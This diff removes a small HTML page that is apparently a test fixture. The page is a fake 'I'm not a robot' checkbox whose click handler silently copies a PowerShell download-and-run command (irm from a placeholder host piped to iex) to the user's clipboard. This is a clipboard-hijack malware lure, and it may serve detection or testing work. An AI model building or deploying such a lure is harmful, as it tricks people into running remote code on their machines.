@@ -1,9 +1,0 @@
-<!doctype html><meta charset="utf-8"><title>captcha</title>
-<label><input type="checkbox" id="robot"> I'm not a robot</label>
-<script>
-// A plain download-and-run command: no disguise, no decoy. On its own it
-// looks like a developer installer; only the outer page reveals the trap.
-document.getElementById('robot').addEventListener('click', async () => {
-  try { await navigator.clipboard.writeText('powershell -c "irm https://example.invalid/x | iex"'); parent.document.title = 'copied'; } catch (e) { parent.document.title = 'error ' + e; }
-});
-</script>
